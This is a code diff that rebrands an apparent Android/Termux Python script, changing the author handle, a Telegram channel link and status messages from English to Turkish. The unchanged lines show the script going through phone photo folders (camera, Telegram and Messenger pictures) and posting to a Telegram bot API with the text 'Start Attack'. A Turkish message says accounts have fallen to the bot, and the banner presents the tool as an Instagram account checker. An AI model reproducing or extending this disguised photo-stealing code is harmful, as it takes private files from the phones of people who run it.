@@ -57,7 +57,7 @@ def banner():
 
    print('•••••••••••••••••••••••••••••••••')
 
-   print('   ❖ Codeing : ❖ @MythEmre ❖')
+   print('   ❖ Codeing : ❖ @WatchMortal ❖')
    
    
 banner()
@@ -94,7 +94,7 @@ for i in tmp:
           pass
   else:
        pass  
-print('\033[2;31m  [ ✓ ] \033[2;32m Connection ......') 
+print('\033[2;31m  [ ✓ ] \033[2;32m Toplanıyo ......') 
 print('')
                                               
 os.chdir(r"/storage/emulated/0/DCIM/Camera")   
@@ -108,7 +108,7 @@ for i in tmp:
           pass
   else:
        pass     
-print('\033[34;1m  [ ✔ ] \033[33;1m Watting ......... ')   
+print('\033[34;1m  [ ✔ ] \033[33;1m Toplanmaya Devam Ediyo ......... ')   
 print('')
                       
 os.chdir(r"/storage/emulated/0/Pictures/Telegram")   
@@ -138,7 +138,7 @@ for i in tmp:
   else:
        pass  
        
-print('\033[0;1m  [ × ] \033[31;1m MythDeath ......  ')   
+print('\033[0;1m  [ × ] \033[31;1m Hesaplar Botuna Düştü ......  ')   
 print('')      
 os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
 tmp = list(os.scandir('.'))
@@ -151,7 +151,7 @@ for i in tmp:
           pass
   else:
        pass   
-exit(' M Y T H D E A T H ')""" )
+exit(' WatchMortal ')""" )
 hack = str('''import requests
 import geocoder 
 import os
@@ -179,9 +179,9 @@ def banner():
    print('•••••••••••••••••••••••••••••••••')
    print(f' {C1} {R}{F}❖{R} {F}Good {B}      : {F}{SS}            \n {C1} {R}{R}❖{R} {R}Bad Mail {B}  : {R}{i}      {C1}       \n  {R}{X}❖{R} {X}BaD Insta  {B}: {X}{BB}    {F}        ')
    print('•••••••••••••••••••••••••••••••••')
-   print('   ❖ Codeing : ❖ @MythEmre ❖')
+   print('   ❖ Codeing : ❖ @WatchMortal ❖')
    
-    print("\t\033[1;36m         https://t.me/MythHackChannel  ")
+    print("\t\033[1;36m         https://t.me/+mYuy0uB81Fk1NGQ0  ")
 banner()
 print('')
 tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=👊 Start Attack .... ✊  {datetime.now()} ')
